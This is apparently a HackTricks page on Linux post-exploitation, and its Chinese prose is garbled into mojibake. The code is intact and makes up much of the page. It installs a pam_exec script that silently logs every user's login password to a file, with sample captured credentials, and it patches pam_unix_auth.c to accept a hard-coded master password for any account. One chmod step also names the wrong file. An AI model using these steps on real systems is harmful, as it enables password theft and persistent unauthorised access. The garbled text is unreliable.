# Linuxåæ¸—é€

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## ä½¿ç”¨PAMå—…æ¢ç™»å½•å¯†ç 

è®©æˆ‘ä»¬é…ç½®ä¸€ä¸ªPAMæ¨¡å—ï¼Œä»¥è®°å½•æ¯ä¸ªç”¨æˆ·ç”¨äºç™»å½•çš„å¯†ç ã€‚å¦‚æœæ‚¨ä¸çŸ¥é“ä»€ä¹ˆæ˜¯PAMï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

é¦–å…ˆï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªbashè„šæœ¬ï¼Œæ¯å½“å‘ç”Ÿæ–°çš„èº«ä»½éªŒè¯æ—¶éƒ½ä¼šè°ƒç”¨è¯¥è„šæœ¬ã€‚
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
```
å˜é‡æ˜¯PAMç‰¹å®šçš„ï¼Œå¹¶å°†é€šè¿‡`pam_exec.so`æ¨¡å—å¯ç”¨ã€‚

ä»¥ä¸‹æ˜¯å˜é‡çš„å«ä¹‰ï¼š

- **$PAM\_USER:** è¾“å…¥çš„ç”¨æˆ·åã€‚
- **$PAM\_RHOST:** è¿œç¨‹ä¸»æœºï¼ˆé€šå¸¸æ˜¯IPåœ°å€ï¼‰
- **$(cat -):** è¿™ä¼šè¯»å–`stdin`ï¼Œå¹¶åŒ…å«è„šæœ¬æŠ“å–çš„å¯†ç 
- ç»“æœè¢«å¯¼å…¥åˆ°`/var/log/toomanysecrets.log`ä¸­çš„æ—¥å¿—æ–‡ä»¶ä¸­

è¦**é˜²æ­¢æ‰€æœ‰ç”¨æˆ·è¯»å–**è¯¥æ–‡ä»¶ï¼Œè¯·è€ƒè™‘é¢„å…ˆåˆ›å»ºå®ƒå¹¶è¿è¡Œ`chmod`ï¼Œä¾‹å¦‚ï¼š
```bash
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
```
æ¥ä¸‹æ¥ï¼Œéœ€è¦æ›´æ–°PAMé…ç½®æ–‡ä»¶ï¼Œå°†ä½¿ç”¨`pam_exec`æ¨¡å—æ¥è°ƒç”¨è„šæœ¬ã€‚

åœ¨`/etc/pam.d/`ç›®å½•ä¸­æœ‰å„ç§é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬é€‰æ‹©`common-auth`ã€‚
```
sudo nano /etc/pam.d/common-auth
```
åœ¨æ–‡ä»¶çš„åº•éƒ¨ï¼Œæ·»åŠ ä»¥ä¸‹èº«ä»½éªŒè¯æ¨¡å—ï¼š

```plaintext
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh
```

è¿™äº›é€‰é¡¹çš„å«ä¹‰å¦‚ä¸‹ï¼š

- **optionalï¼š** å¦‚æœå‡ºç°é”™è¯¯ï¼Œè®¤è¯ä¸ä¼šå¤±è´¥ï¼ˆè¿™ä¸æ˜¯å¿…éœ€çš„æ­¥éª¤ï¼‰
- **pam\_exec.soï¼š** è¿™æ˜¯å¯ä»¥è°ƒç”¨ä»»æ„è„šæœ¬çš„ç°æˆ PAM æ¨¡å—
- **expose\_authtokï¼š** è¿™æ˜¯é€šè¿‡ `stdin` è¯»å–å¯†ç çš„æŠ€å·§
- **quietï¼š** ä¸å‘ç”¨æˆ·æ˜¾ç¤ºä»»ä½•é”™è¯¯ï¼ˆå¦‚æœæœ‰ä»€ä¹ˆé—®é¢˜ï¼‰
- æœ€åä¸€ä¸ªå‚æ•°æ˜¯ä¹‹å‰åˆ›å»ºçš„ shell è„šæœ¬

![](<../../.gitbook/assets/image (375).png>)

æœ€åï¼Œå°†æ–‡ä»¶è®¾ç½®ä¸ºå¯æ‰§è¡Œï¼š

```plaintext
sudo chmod 700 /usr/local/bin/toomanysecrets.sh
```

ç°åœ¨ï¼Œè®©æˆ‘ä»¬å°è¯•ä¸€ä¸‹ï¼Œä»å¦ä¸€å°æœºå™¨è¿›è¡Œ SSH ç™»å½•ï¼Œæˆ–è€…æœ¬åœ°ç™»å½•ã€‚

ç„¶åæŸ¥çœ‹æ—¥å¿—æ–‡ä»¶ï¼š
```
$ sudo cat /var/log/toomanysecrets.log
Sun Jun 26 23:36:37 PDT 2022 tom, Trustno1!, From: 192.168.1.149
Sun Jun 26 23:37:53 PDT 2022 tom, Trustno1!, From:
Sun Jun 26 23:39:12 PDT 2022 tom, Trustno1!, From: 192.168.1.149
```
### åé—¨PAM

è®©æˆ‘ä»¬è¿›å…¥PAMçš„æºä»£ç ï¼ˆå–å†³äºæ‚¨çš„å‘è¡Œç‰ˆï¼Œé€‰æ‹©ä¸æ‚¨ç›¸åŒç‰ˆæœ¬å·çš„æ–‡ä»¶..ï¼‰å¹¶æŸ¥çœ‹pam_unix_auth.cæ–‡ä»¶ä¸­çš„170/180è¡Œé™„è¿‘ï¼š
```
vi modules/pam_unix/pam_unix_auth.c
```
![](<../../.gitbook/assets/image (651).png>)

è®©æˆ‘ä»¬é€šè¿‡ä»¥ä¸‹æ–¹å¼æ›´æ”¹ï¼š

![](<../../.gitbook/assets/image (638) (2) (2).png>)

è¿™å°†å…è®¸ä»»ä½•ä½¿ç”¨**å¯†ç "0xMitsurugi"**çš„ç”¨æˆ·ç™»å½•ã€‚

é‡æ–°ç¼–è¯‘`pam_unix_auth.c`ï¼Œå¹¶æ›¿æ¢`pam_unix.so`æ–‡ä»¶ï¼š
```bash
make
sudo cp \
/home/mitsurugi/PAM/pam_deb/pam-1.1.8/modules/pam_unix/.libs/pam_unix.so \
/lib/x86_64-linux-gnu/security/
```
{% hint style="info" %}
æ‚¨å¯ä»¥ä½¿ç”¨[https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)æ¥è‡ªåŠ¨åŒ–æ­¤è¿‡ç¨‹ã€‚
{% endhint %}

## å‚è€ƒèµ„æ–™

* [https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)
* [https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºè‹±é›„ï¼Œä½¿ç”¨</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
